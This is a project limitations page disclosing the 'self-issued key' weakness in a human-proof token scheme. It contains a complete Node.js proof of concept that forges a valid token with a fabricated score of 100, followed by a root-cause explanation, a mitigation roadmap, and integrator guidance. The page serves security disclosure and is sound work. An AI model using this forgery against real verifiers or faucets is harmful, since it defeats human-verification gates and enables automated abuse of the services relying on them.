# Known Limitations & Regression Tests

**Last reviewed:** 26 September 2026  
**Reviewed by:** pk910 (external audit)

## The Self-Issued Key Attack (v0.1)

A determined attacker controlling the execution environment can forge a valid Human Proof Token with any score, without performing the actual challenge.

### Proof of Concept (Node.js, 12 lines)

```javascript
import { webcrypto as crypto } from "node:crypto";

const b64url = b => Buffer.from(b).toString("base64")
  .replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");

const nowS = Math.floor(Date.now() / 1000);
const nonce = new Uint8Array(16);
crypto.getRandomValues(nonce);

const payload = {
  v: 5,
  type: "zcp2o-human-proof",
  challenge: "hp1",
  score: 100,  // FABRICATED — no real interaction
  nonce: b64url(nonce),
  layers: { motor: 100, sensor: 100, bonus: 100 },
  signals_digest: "00".repeat(32),
  issued_at: nowS,
  expires_at: nowS + 300,
  tier: "light",
  assurance: "self"
};

const kp = await crypto.subtle.generateKey(
  { name: "RSA-PSS", modulusLength: 2048,
    publicExponent: new Uint8Array([1, 0, 1]), hash: "SHA-256" },
  true, ["sign", "verify"]
);

const sig = new Uint8Array(
  await crypto.subtle.sign(
    { name: "RSA-PSS", saltLength: 32 },
    kp.privateKey,
    new TextEncoder().encode(JSON.stringify(payload))
  )
);

const jwk = await crypto.subtle.exportKey("jwk", kp.publicKey);

const token = b64url(new TextEncoder().encode(JSON.stringify({
  ...payload,
  sig: b64url(sig),
  pubkey: { kty: jwk.kty, n: jwk.n, e: jwk.e }
})));

process.stdout.write(token);
```

**Result:** produces a valid token with score 100. Any server-side verifier that only checks signature integrity will accept it.

### Why This Happens

- RSA keypair is generated **client-side** (self-issued)
- Score is computed **client-side**
- `signals_digest` is a hash of data the server never sees
- Verifier can only check: signature matches embedded key, nonce not reused, token not expired
- Verifier **cannot** distinguish a forged token from a real session

### Mitigation Status

| Version | Status |
| --- | --- |
| **v0.1 (current)** | Known limitation — accepted by design for privacy + offline |
| **v0.2 (roadmap)** | Mesh peer co-signatures — attacker must fool N nearby devices |
| **v1.0 (roadmap)** | Bunker trust-weighted co-signature — attacker must compromise an institution |

### Guidance for Integrators

**If your use case requires adversarial-grade proof:**
- Do NOT rely on v0.1 tokens alone for high-value decisions
- Wait for v0.2+ with co-signing, or
- Implement server-issued challenges (design TBD), or
- Use ZCP2O Human Proof as a **rate multiplier** on top of baseline PoW, not as a gate

**If your use case is privacy-first offline verification:**
- v0.1 is appropriate — it blocks naive bots and preserves privacy
- Be transparent with users about assurance level (`self`)

## Credit

This PoC and analysis were provided by **@pk910** in [PoWFaucet issue #528](https://github.com/pk910/PoWFaucet/issues/528). Thank you for the thorough review — this is exactly the kind of criticism open-source projects need and rarely get.

## Related Documentation

- [architecture.md §8](./architecture.md#appendix-a-token-forgery--progressive-assurance) — honest positioning and progressive assurance
- [README.md](../README.md) — main project documentation